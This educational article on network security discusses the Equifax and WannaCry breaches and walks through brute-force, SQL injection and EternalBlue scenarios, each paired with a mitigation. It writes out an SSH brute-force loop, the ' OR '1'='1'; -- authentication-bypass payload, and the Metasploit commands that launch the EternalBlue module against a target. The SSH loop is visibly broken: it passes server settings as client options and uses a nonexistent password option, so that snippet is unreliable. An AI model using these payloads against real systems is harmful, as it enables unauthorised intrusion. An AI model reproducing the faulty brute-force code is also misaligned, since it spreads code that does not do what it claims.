The Equifax Data Breach - Firewalls and the Importance of Network Segmentation

The Equifax data breach of 2017 serves as a stark example of the critical role firewalls play in securing sensitive information. In this incident, hackers exploited a vulnerability in Apache Struts, a web application framework. The absence of a robust firewall and inadequate network segmentation allowed the attackers to move laterally within Equifax's network.

Example Network Breach - Brute Force

In this section, we'll explore a fictional scenario demonstrating a network security fault and how it might be exploited.

Scenario: Insecure Remote Access

One common network security fault is insecure remote access. Let's consider a scenario where a network allows remote access with weak authentication.

Exploitation

An attacker discovers a poorly configured remote access service (e.g., SSH) with weak passwords. They attempt to gain unauthorised access using a brute-force attack.

Code Snippets

Bash 

# Attempting to brute-force SSH with weak passwords
for password in $(cat password_list.txt); do
    ssh username@target_server -p 22 -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password -o ChallengeResponseAuthentication=no -o UsePAM=no -o PermitRootLogin=no -o PermitEmptyPasswords=no -o AuthenticationMethods=password -o PasswordAuthentication=yes -o KbdInteractiveAuthentication=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=5 -o BatchMode=yes -o ServerAliveInterval=10 -o ServerAliveCountMax=3 -o User=username -o Password=$password
done

Mitigation

To mitigate such vulnerabilities, organisations should enforce strong authentication practices, implement two-factor authentication, and regularly audit and monitor remote access logs for suspicious activities.

Example Network Breach - SQL Injection

In this section, we'll explore a scenario involving a common web application vulnerability known as SQL Injection.

Scenario: Vulnerable Login Form

A web application uses a login form to authenticate users. However, the login form is vulnerable to SQL Injection.

Exploitation

An attacker discovers the vulnerability and manipulates the input fields to bypass authentication and gain unauthorised access.

Code Snippet - SQL Injection

SQL 

-- SQL code for a vulnerable login form
SELECT * FROM users
WHERE username = 'input_username' AND password = 'input_password';

-- Malicious input for SQL injection
' OR '1'='1'; --
-- This input alters the query condition and allows unauthorised access

Mitigation

To prevent SQL Injection attacks, developers should use parameterised queries or prepared statements and input validation.

Prepared Statements

PHP 

// Using prepared statements in PHP

$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$input_username, $input_password]);
$user = $stmt->fetch();

Input Validation

PHP 

// Input validation in PHP
if (preg_match('/^[a-zA-Z0-9]+$/', $input_username)) {
    // Valid username format
} else {
    // Invalid username format, handle appropriately
}

Implementing prepared statements and input validation helps prevent malicious SQL Injection attempts.

WannaCry Ransomware (2017)

WannaCry exploited a vulnerability in Microsoft Windows, spreading rapidly across networks. It encrypted files on infected computers and demanded a ransom for their release.

Scenario

The malware leveraged the EternalBlue exploit, originally developed by the NSA. It targeted unpatched Windows systems, affecting hospitals, businesses, and government organisations globally.

Exploitation

WannaCry exploited a vulnerability in unpatched Windows systems using the EternalBlue exploit.

Code Snippet

Bash 

# EternalBlue exploit code snippet
# (Note: This is a simplified example for illustrative purposes)

msf > use exploit/windows/smb/ms17_010_eternalblue

# This line tells Metasploit to use the EternalBlue exploit module for Windows SMB with the identifier ms17_010_eternalblue.
                    

msf exploit(ms17_010_eternalblue) > set RHOSTS target_ip

# This line sets the target IP address (RHOSTS) for the exploit. Replace 'target_ip' with the actual IP address of the target system.
                    

msf exploit(ms17_010_eternalblue) > exploit

# This line executes the exploit. Once executed, it attempts to take advantage of the EternalBlue vulnerability on the specified target IP.

Mitigation

1. Patching: Apply Microsoft's security patch to address the vulnerability.
2. Endpoint Protection: Utilise advanced endpoint protection solutions to detect and block WannaCry.
3. Network Segmentation: Isolate critical systems to prevent the spread of the malware.
